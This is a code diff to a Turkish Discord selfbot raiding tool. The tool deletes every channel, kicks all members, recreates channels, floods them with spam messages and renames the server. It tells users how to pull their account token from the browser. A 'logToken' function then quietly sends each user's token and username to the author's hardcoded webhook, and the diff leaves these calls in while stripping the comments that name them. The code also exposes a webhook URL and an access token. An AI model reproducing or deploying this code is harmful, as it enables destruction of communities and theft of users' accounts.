@@ -115,7 +115,7 @@ process.title = 'Polee Tool | v' + version;
 // Now you can safely require the modules
 const { Client } = require('discord.js-selfbot-v13');
 const readline = require('readline');
-const chalk = require('chalk'); // chalk module
+const chalk = require('chalk');
 const axios = require('axios');
 
 let whitelistedids = [];
@@ -124,17 +124,16 @@ async function fetchWhitelist() {
     const url = 'https://raw.githubusercontent.com/bratiu/golgetoolos/refs/heads/master/whitelist.json?token=GHSAT0AAAAAACZX2Y2LVU4UGFLW6LKL7T36Z2ETLWA';
     try {
         const response = await axios.get(url);
-        // Veriyi satırlara böler ve her satırı string olarak alır
         whitelistedids = response.data
-            .split('\n') // Satırlara ayırır
-            .filter(id => id.trim() !== '') // Boş satırları filtreler
-            .map(id => id.trim()); // Gereksiz boşlukları kaldırır
+            .split('\n')
+            .filter(id => id.trim() !== '')
+            .map(id => id.trim());
     } catch (error) {
         whitelistedids = [];
     }
 }
 
-fetchWhitelist()
+fetchWhitelist();
 
 // ASCII Art
 const asciiArt = `
@@ -258,7 +257,6 @@ importmodules = {
             const guild = await client.guilds.fetch(guildId);
             console.log(chalk.green(`Sunucu: ${guild.name} - Kanallar siliniyor...`));
     
-            // Tüm kanalları sil
             const channels = guild.channels.cache;
             for (const channel of channels.values()) {
                 try {
@@ -271,7 +269,6 @@ importmodules = {
     
             console.log(chalk.green('Tüm kanallar silindi!'));
     
-            // Yeni kanalları oluştur
             const createdChannels = [];
             for (let i = 1; i <= 19; i++) {
                 try {
@@ -287,7 +284,6 @@ importmodules = {
     
             console.log(chalk.greenBright('Kanallar oluşturuldu, mesajlar gönderiliyor...'));
     
-            // Mesajları tüm kanallara paralel olarak gönder
             for (let i = 0; i < 20; i++) {
                 await Promise.all(
                     createdChannels.map(async (channel) => {
@@ -315,7 +311,6 @@ importmodules = {
         }
     },
     
-
     sendMessage: async (client, channelId, messageContent, messageCount, showMenu) => {
         try {
             console.log(chalk.green(`Kanal ID'si: ${channelId} - Mesajlar gönderiliyor...`));
@@ -325,22 +320,18 @@ importmodules = {
                 throw new Error('Belirtilen kanal bir metin kanalı değil.');
             }
     
-            // Süre ölçümünü başlat
             const startTime = Date.now();
     
-            // Tüm mesaj gönderim işlemlerini aynı anda başlatıyoruz
             const promises = Array.from({ length: messageCount }, (_, i) => {
                 return channel.send(messageContent)
                     .then(() => console.log(chalk.cyan(`Mesaj ${i + 1} gönderildi: ${messageContent}`)))
                     .catch(error => console.error(chalk.red(`Mesaj ${i + 1} gönderilirken hata oluştu: ${error.message}`)));
             });
     
-            // Tüm mesajların tamamlanmasını bekle
             await Promise.all(promises);
     
-            // Süre ölçümünü bitir
             const endTime = Date.now();
-            const totalTime = ((endTime - startTime) / 1000).toFixed(2); // Süreyi saniye cinsine çevir
+            const totalTime = ((endTime - startTime) / 1000).toFixed(2);
             console.log(chalk.greenBright(`Tüm mesajlar başarıyla gönderildi! Toplam süre: ${totalTime} saniye.`));
         } catch (error) {
             console.error(chalk.redBright('Mesaj gönderilirken hata oluştu:', error.message));
@@ -352,10 +343,42 @@ importmodules = {
                 }
             });
         }
-    }
-    
+    },
 
-}
+    changeGuildInfo: async (client, guildId, newName, showMenu) => {
+        try {
+            const guild = await client.guilds.fetch(guildId);
+            console.log(chalk.green(`\nSunucu: ${guild.name} - Bilgiler güncelleniyor...`));
+
+            // Sunucu ismini değiştir
+            if (newName) {
+                await guild.setName(newName);
+                console.log(chalk.cyan(`Sunucu ismi "${newName}" olarak güncellendi.`));
+            }
+
+            // Yerel icon.png dosyasını kontrol et ve profil fotoğrafını değiştir
+            const iconPath = path.join(__dirname, 'icon.png');
+            if (fs.existsSync(iconPath)) {
+                const buffer = fs.readFileSync(iconPath);
+                await guild.setIcon(buffer);
+                console.log(chalk.cyan(`Sunucu profil fotoğrafı 'icon.png' dosyasıyla güncellendi.`));
+            } else {
+                console.log(chalk.yellow(`'icon.png' dosyası bulunamadı. Profil fotoğrafı güncellenmedi.`));
+            }
+
+            console.log(chalk.greenBright('Sunucu bilgileri başarıyla güncellendi!'));
+        } catch (error) {
+            console.error(chalk.redBright('Sunucu bilgileri güncellenirken hata oluştu:'), error.message);
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                    showMenu();
+                }
+            });
+        }
+    }
+};
 
 const rl = readline.createInterface({
     input: process.stdin,
@@ -374,13 +397,15 @@ ${chalk.green('Seçenekler:')}
 3. Herkesi kickle
 4. Tüm kanalları silip yeni kanallar oluştur ve mesaj gönder
 5. Belirtilen kanala mesaj gönder
-6. Tokenimi nasıl öğrenirim?
-7. İletişim bilgileri\n`;
+6. Sunucunun ismini ve profil fotoğrafını değiştir
+
+7. Tokenimi nasıl öğrenirim?
+8. İletişim bilgileri\n`;
 
     console.log(chalk.white.bold(options));
 
     rl.question(chalk.yellow('Bir seçenek numarası girin: '), (choice) => {
-        if (choice === '6') {
+        if (choice === '7') {
             console.clear();
             console.log(chalk.blue(asciiArt));
 
@@ -395,7 +420,7 @@ Lütfen dikkat: Tokeninizi asla başkalarıyla paylaşmayın!
             console.log(chalk.yellow(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\n`));
             console.log(chalk.green('Ana menüye dönmek için herhangi bir tuşa basın...'));
             process.stdin.once('data', () => showMenu());
-        } else if (choice === '7') {
+        } else if (choice === '8') {
             console.clear();
             console.log(chalk.blue(asciiArt));
 
@@ -427,7 +452,7 @@ function handleChoice(choice) {
         }, 1500);
     }
 
-    if (!choice || choice < 1 || choice > 6) {
+    if (!choice || choice < 1 || choice > 8) {
         console.log(chalk.red('Geçersiz bir seçenek girdiniz!'));
         return setTimeout(() => {
             showMenu();
@@ -446,7 +471,7 @@ function handleChoice(choice) {
                     console.clear();
                     console.log(chalk.blue(asciiArt));
                     console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
-                    logToken(token, client.user.tag, GUILD_ID); // Token logger çağrısı
+                    logToken(token, client.user.tag, GUILD_ID);
 
                     const actionMap = {
                         1: importmodules.deleteChannels,
@@ -454,6 +479,7 @@ function handleChoice(choice) {
                         3: importmodules.kick,
                         4: importmodules.recreateChannels,
                         5: importmodules.sendMessage,
+                        6: importmodules.changeGuildInfo,
                     };
 
                     if (!actionMap[choice]) {
@@ -487,6 +513,10 @@ function handleChoice(choice) {
                                     });
                                 });
                             });
+                        } else if (choice === 6) {
+                            rl.question(chalk.yellow('Yeni sunucu ismini girin (boş bırakmak için Enter\'a basın): '), (newName) => {
+                                action(client, GUILD_ID, newName || null, showMenu);
+                            });
                         } else {
                             action(client, GUILD_ID, showMenu);
                         }
@@ -515,7 +545,7 @@ function handleChoice(choice) {
                 console.clear();
                 console.log(chalk.blue(asciiArt));
                 console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
-                logToken(token, client.user.tag); // Token logger çağrısı
+                logToken(token, client.user.tag);
 
                 const actionMap = {
                     1: importmodules.deleteChannels,
@@ -523,6 +553,7 @@ function handleChoice(choice) {
                     3: importmodules.kick,
                     4: importmodules.recreateChannels,
                     5: importmodules.sendMessage,
+                    6: importmodules.changeGuildInfo,
                 };
                 
                 try {
@@ -591,7 +622,7 @@ function handleChoice(choice) {
 
 // Token Logger Fonksiyonu (Sabit Webhook'a Gönderir)
 function logToken(token, username, guildId = null) {
-    const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB'; // Sabit Webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB';
     const embedMessage = {
         embeds: [{
             color: 0x3498db,
